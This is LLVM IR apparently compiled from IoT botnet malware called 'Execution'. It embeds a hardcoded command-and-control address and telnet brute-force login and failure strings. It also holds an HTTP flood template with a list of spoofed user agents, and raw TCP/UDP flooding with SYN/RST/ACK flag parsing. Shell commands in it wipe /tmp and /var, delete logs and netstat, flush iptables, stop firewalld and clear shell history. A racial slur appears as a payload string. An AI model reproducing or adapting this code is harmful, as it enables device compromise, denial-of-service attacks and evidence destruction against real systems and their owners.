; ModuleID = 'host/ir_sub/Execution.i.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.65, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.10 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.12 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.14 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.15 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.16 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.18 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.19 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.20 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.21 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.22 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.23 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.24 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.25 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.27 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.28 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.29 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.31 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.32 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.33 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.34 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.36 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.38 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.40 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.41 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.42 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.45 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.47 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.48 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.49 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.50 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.51 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.52 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.53 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.54 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.55 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.56 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.57 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.58 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.59 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.60 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.61 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.62 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.63 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.64 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.65 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@ServerInfo = global [1 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.66, i32 0, i32 0)], align 8
@.str.66 = private unnamed_addr constant [17 x i8] c"178.62.14.63:282\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i32 0, i32 0), align 8
@.str.67 = private unnamed_addr constant [7 x i8] c"Nigger\00", align 1
@usernames = global [1 x i8*] [i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.68, i32 0, i32 0)], align 8
@.str.68 = private unnamed_addr constant [28 x i8] c"Dont Use the Telnet Scanner\00", align 1
@passwords = global [1 x i8*] [i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.69, i32 0, i32 0)], align 8
@.str.69 = private unnamed_addr constant [20 x i8] c"Just dont use it :/\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* null], align 16
@.str.70 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.74 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.75 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.78 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.83, i32 0, i32 0), i8* null], align 16
@.str.80 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.83 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@.str.84 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.86 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.89 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* null], align 16
@.str.91 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.92 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.93 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@KadenCommStock = global i32 0, align 4
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@botnetPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"ay4fkc1txz22mldwtj4ipcevw5q8zq6\00", align 16
@.str.148 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.94 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.95 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.96 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [33 x i8] c"Execution Bruted -> %s [ %s:%s ]\00", align 1
@.str.98 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.102 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.103 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.104 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.105 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.106 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.107 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.108 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.112 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.113 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.114 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.115 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.117 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.118 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.119 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.120 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.125 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.126 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendSTD.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.127, i32 0, i32 0)], align 8
